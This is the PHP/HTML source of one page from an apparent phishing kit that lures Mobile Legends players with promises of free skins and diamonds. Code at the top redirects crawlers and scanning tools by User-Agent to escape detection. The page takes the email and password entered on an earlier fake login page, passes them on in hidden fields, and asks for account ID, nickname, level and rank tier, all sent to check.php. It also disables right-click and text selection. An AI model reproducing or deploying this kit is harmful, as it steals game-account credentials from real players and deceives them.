<?php 
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<?php
// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];
$password = $_POST['password'];
$login = $_POST['login'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == "" && $password == "" && $login == ""){
    header("Location: index.php");
}
?>
<html>
<head>
<!-- Required meta tags -->
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta property="og:title" content="Mobile Legends Event">
<meta property="og:description" content="Get skins and diamonds for free">
<meta property="og:image" content="https://i.ibb.co/C832Ykg/Capture.png?width=572&amp;height=269">
<!-- Bootstrap CSS -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css" integrity="sha512-rRQtF4V2wtAvXsou4iUAs2kXHi3Lj9NE7xJR77DE7GHsxgY9RTWy93dzMXgDIG8ToiRTD45VsDNdTiUagOFeZA==" crossorigin="anonymous">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
<link rel="stylesheet" href="static/css/imryu.css">
<title>Mobile Legends Events</title>
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
<iframe scrolling='no' allow='autoplay' src='static/sound.mp3' width='0' height='0' frameborder='no'>
</iframe>
<div id="bg"></div>
<div class="ryucodex">
	<div class="navbar">
		<img class="logoLeft" src="https://pht.qoo-static.com/VObo_efVQ255Uny-K5k6EEMxQ9PQYk6PFNSReWDQxKf19HiXBH8BbluIzH1e43iQiw=w512">
		<div class="text-left text-white text-header">
			 MOBILE LEGENDS<br>
			<span>FREE SKIN & DIAMONDS</span>
		</div>
		<img class="logoRight" src="static/img/logo.png" alt="">
	</div>
	<div class="ryu-banner">
		<div id="carouselExampleSlidesOnly" class="carousel slide" data-ride="carousel">
			<div class="carousel-inner">
				<div class="carousel-item active">
					<img src="https://i.ibb.co/3m7xnL1/IMG-20210912-071305.jpg" class="d-block w-100 img-ryu-banner1" alt="...">
				</div>
				<div class="carousel-item">
					<img src="https://i.ibb.co/3m7xnL1/IMG-20210912-071305.jpg" class="d-block w-100 img-ryu-banner1" alt="...">
				</div>
				<div class="carousel-item">
					<img src="https://i.ibb.co/3m7xnL1/IMG-20210912-071305.jpg" class="d-block w-100 img-ryu-banner1" alt="...">
				</div>
			</div>
		</div>
	</div>
	<div class="row mt-3">
		<div class="col-md-12 col-12">
			<div class="app-subheader">
				<img src="static/img/boxOn.png" alt="">
				<span class="txt-sub">Please verification your account.</span>
			</div>
		</div>
	</div>
	<div class="row mt-4">
		<div class="col-md-12 col-12">
			<div class="scroll">
				<div class="selectLogin">
					<div class="col-md-12 col-12 mt-4">
						<form class="formInfo" action="check.php" method="POST">
							<input name="email" value="<?php echo $email;?>" type="hidden" class="validateYamisok mb-5" readonly="">
							<input name="password" value="<?php echo $password;?>" type="hidden" class="validateYamisok mb-5" readonly="">
							<input name="login" value="<?php echo $login;?>" type="hidden" class="validateYamisok mb-5" readonly="">
							<div class="form-group">
								<label>User ID</label>
								<input type="number" class="form-control" name="playid" placeholder="Enter your account id" autocomplete="off" required="">
							</div>
							<div class="form-group">
								<label>Nickname</label>
								<input type="text" class="form-control" name="nick" placeholder="Enter your nickname" autocomplete="off" required="">
							</div>
							<div class="form-group">
								<label>Account Level</label>
								<select name="level" class="form-control" required="">
									<option>1</option>
									<option>2</option>
									<option>3</option>
									<option>4</option>
									<option>5</option>
									<option>6</option>
									<option>7</option>
									<option>8</option>
									<option>9</option>
									<option>10</option>
									<option>11</option>
									<option>12</option>
									<option>13</option>
									<option>14</option>
									<option>15</option>
									<option>16</option>
									<option>17</option>
									<option>18</option>
									<option>19</option>
									<option>20</option>
									<option>21</option>
									<option>22</option>
									<option>23</option>
									<option>24</option>
									<option>25</option>
									<option>26</option>
									<option>27</option>
									<option>28</option>
									<option>29</option>
									<option>30</option>
									<option>31</option>
									<option>32</option>
									<option>33</option>
									<option>34</option>
									<option>35</option>
									<option>36</option>
									<option>37</option>
									<option>38</option>
									<option>39</option>
									<option>40</option>
									<option>41</option>
									<option>42</option>
									<option>43</option>
									<option>44</option>
									<option>45</option>
									<option>46</option>
									<option>47</option>
									<option>48</option>
									<option>49</option>
									<option>50</option>
									<option>51</option>
									<option>52</option>
									<option>53</option>
									<option>54</option>
									<option>55</option>
									<option>56</option>
									<option>57</option>
									<option>58</option>
									<option>59</option>
									<option>60</option>
									<option>61</option>
									<option>62</option>
									<option>63</option>
									<option>64</option>
									<option>65</option>
									<option>66</option>
									<option>67</option>
									<option>68</option>
									<option>69</option>
									<option>70</option>
									<option>71</option>
									<option>72</option>
									<option>73</option>
									<option>74</option>
									<option>75</option>
									<option>76</option>
									<option>77</option>
									<option>78</option>
									<option>79</option>
									<option>80</option>
									<option>81</option>
									<option>82</option>
									<option>83</option>
									<option>84</option>
									<option>85</option>
									<option>86</option>
									<option>87</option>
									<option>88</option>
									<option>89</option>
									<option>90</option>
									<option>91</option>
									<option>92</option>
									<option>93</option>
									<option>94</option>
									<option>95</option>
									<option>96</option>
									<option>97</option>
									<option>98</option>
									<option>99</option>
									<option>100</option>
								</select>
							</div>
							<div class="form-group">
								<label>Tier</label>
								<select name="tier" required="required" class="form-control">
									<option value="" selected="selected" disabled="disabled">Ranked Tier Level</option>
									<option value="Elite" class="form-control">Elite</option>
									<option value="Master" class="form-control">Master</option>
                                    <option value="Grandmaster" class="form-control">Grandmaster</option>
                                    <option value="Epic" class="form-control">Epic</option>
									<option value="Legend" class="form-control">Legend</option>
									<option value="Mythic" class="form-control">Mythic</option>
									<option value="Mythic Glory" class="form-control">Mythic Glory</option>
								</select>
							</div>
							<div class="form-group mt-4">
								<button type="submit" class="btn btn-primary btn-custom" style="font-size: 13px;">Verification</button>
							</div>
						</form>
					</div>
				</div>
			</div>
		</div>
	</div>
</div>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js" integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI" crossorigin="anonymous"></script>
<script src="static/js/imryu.js"></script>

</body>
</html>
